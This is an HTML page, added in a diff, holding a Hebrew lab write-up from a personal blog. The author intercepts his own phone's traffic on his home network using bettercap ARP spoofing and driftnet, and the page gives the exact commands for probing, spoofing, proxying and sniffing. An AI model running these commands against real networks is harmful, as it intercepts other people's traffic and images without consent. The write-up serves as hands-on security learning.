@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="../css/reset.css">
+  <link rel="stylesheet" href="../css/main.css">
+  <link rel="stylesheet" href="../css/media.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+  <title>מעבדת סייבר - 2</title>
+</head>
+<body dir="rtl">
+  <header>
+    <h1>מיליון פרויקטים</h1>
+    <h4>טכנולוגיה, מדע, אומנות וכל מה שביניהם ומסביבם</h4>
+  </header>
+  <div class="main">
+    <div class="post">
+      <div class="header">
+        <div class="right">
+          <h1 class="title">מעבדת סייבר - 2</h1>
+          <div class="author-date">יניב אור - 30 באפר׳ 2020</div>
+        </div>
+        <a href="../" class="back">לדף הראשי</a>
+      </div>
+      <div class="content">
+        <p>המטרה</p>
+<p>לגרום לקורבן להעביר את כל התעבורה שלו - במקום דרך הראוטר - דרך התוקף ובנוסף להציג על המסך תמונות שעברו בתעבורה הזאת.</p>
+<p>התוקף</p>
+<p>לפטופ Asus ROG Strix - מריץ אובונטו 18.04.</p>
+<p>הקורבן</p>
+<p>סמארטפון OnePlus X שברשותי - מריץ Android 6.0.1.</p>
+<p>הכלים</p>
+<p>- התוכנה bettercap - רצה בקונטיינר נפרד. ראו: Bettercap.</p>
+<p><a href="https://www.a-million-projects.com/post/bettercap"><span style="color:#ffffff"><u class="_3zM-5">Bettercap</u></span></a></p>
+<p>Bettercap</p>
+<p>.</p>
+<p>- התוכנה driftnet - גם היא רצה בקונטיינר נפרד. ראו: driftnet.</p>
+<p><a href="https://www.a-million-projects.com/post/driftnet"><span style="color:#ffffff"><u class="_3zM-5">driftnet</u></span></a></p>
+<p>driftnet</p>
+<p>הערות</p>
+<p>- המכשירים שייכים לי, כמובן, והניסוי נערך ברשת הביתית שלי.</p>
+<p>- נקודת המוצא היא שאני והקורבן מחוברים לאותה רשת. במציאות זה לאו דווקא יהיה המצב, כמובן, ואצטרך למצוא דרך להיכנס לרשת שבה נמצא הקורבן או להעביר אותו לרשת שלי.</p>
+<p>שלבי התקיפה</p>
+<p>הרצתי את הקונטיינר כך שיהיה במצב אינטראקטיבי וישתמש בהגדרות רשת של ה-host.</p>
+<p>$ docker run --rm -it --privileged --net=host bettercap/bettercap
+
+</p>
+<p><img src="https://static.wixstatic.com/media/17f292_fd79e60916234d5f8026a1e2f5be8ac7~mv2.png" /></p>
+<p>לאחר מכן, בטרמינל של התוכנה, ביצעתי probe לגילוי מכשירים ברשת.</p>
+<p>» net.probe on</p>
+<p>ברגע שזיהיתי את מכשיר הקורבן - OnePlus Tech (Shenzhen) Ltd בכתובת 192.168.1.8 - כיביתי את ה-probe.</p>
+<p>» net.probe off</p>
+<p><img src="https://static.wixstatic.com/media/17f292_00384ea18c804ba79a72852a50e4278e~mv2.png" /></p>
+<p>הגדרתי arp spoof לכתובת IP הרצויה, הרצתי arp spoof ובמקביל הרצתי proxy כדי שהתעבורה של מכשיר הקורבן, שתעבור דרכי, תעבור לראוטר וכדי שהתעבורה מהראוטר, שתגיעהאלי, תעבור למכשיר הקורבן.</p>
+<p>» set arp.spoof.targets 192.168.1.8</p>
+<p>» arp.spoof on</p>
+<p>» http.proxy on</p>
+<p><img src="https://static.wixstatic.com/media/17f292_801e57862e2e40a8b6349432504226d6~mv2.png" /></p>
+<p>לאחר מכן הרצתי את ה-driftnet.</p>
+<p>$ docker run --rm -it --env DISPLAY=unix$DISPLAY --network host dsniff driftnet -i wlo1</p>
+<p><img src="https://static.wixstatic.com/media/17f292_8d2ee5995d524039bad4c2bfa305b0e1~mv2.png" /></p>
+<p>ובמקביל גלשתי עם מכשיר הקורבן לאתר ששייך לי ובו התעבורה עוברת ב-HTTP.</p>
+<p><img src="https://static.wixstatic.com/media/17f292_6395bb2ff7474df4aad81a769dc998e8~mv2.png" /></p>
+<p>כפי שניתן לראות, התקיפה בוצעה בהצלחה - אך במצב אמיתי, אין לי גישה למכשיר הקורבן ואני לא באמת יודע אם ה-arp spoof וה-proxy עובד - לכן, לצורך debug, הרצתי ב-bettercap את הפקודה net sniff עם verbosity נמוך והתעבורה הופיעה על המסך.</p>
+<p>» set net.sniff.verbose false</p>
+<p>» net.sniff on</p>
+<p><img src="https://static.wixstatic.com/media/17f292_c4849ea7aafb452381c4ed8ee84acbef~mv2.png" /></p>
+<p>שימו לב לפשטות שבשימוש ב-bettercap יחסית לדרך שמוצגת במעבדה: מעבדת סייבר - 1</p>
+<p>שימו לב לפשטות שבשימוש ב-bettercap יחסית לדרך שמוצגת במעבדה: </p>
+<p><a href="https://www.a-million-projects.com/post/%D7%9E%D7%A2%D7%91%D7%93%D7%AA-%D7%A1%D7%99%D7%99%D7%91%D7%A8-%D7%A7%D7%A8%D7%99%D7%90%D7%94-%D7%95%D7%A2%D7%A8%D7%99%D7%9B%D7%AA-%D7%AA%D7%A2%D7%91%D7%95%D7%A8%D7%94-%D7%A9%D7%9C-%D7%A7%D7%95%D7%A8%D7%91%D7%9F-%D7%91%D7%A8%D7%A9%D7%AA"><span style="color:#5e8f86"><u class="_3zM-5">מעבדת סייבר - 1</u></span></a></p>
+<p>מעבדת סייבר - 1</p>
+<p>מעבדות נוספות:</p>
+<p>מעבדות סייבר</p>
+<p><a href="https://www.a-million-projects.com/post/%D7%9E%D7%A2%D7%91%D7%93%D7%95%D7%AA-%D7%A1%D7%99%D7%99%D7%91%D7%A8"><span style="color:#5e8f86"><u class="_3zM-5">מעבדות סייבר</u></span></a></p>
+
+      </div>
+    </div>
+    <div class="related-posts">
+      <div class="title">פוסטים נוספים</div>
+      {{related-posts}}
+    </div>
+  </div>
+  <footer></footer>
+  <script src="../js/main.js"></script>
+</body>
+</html>
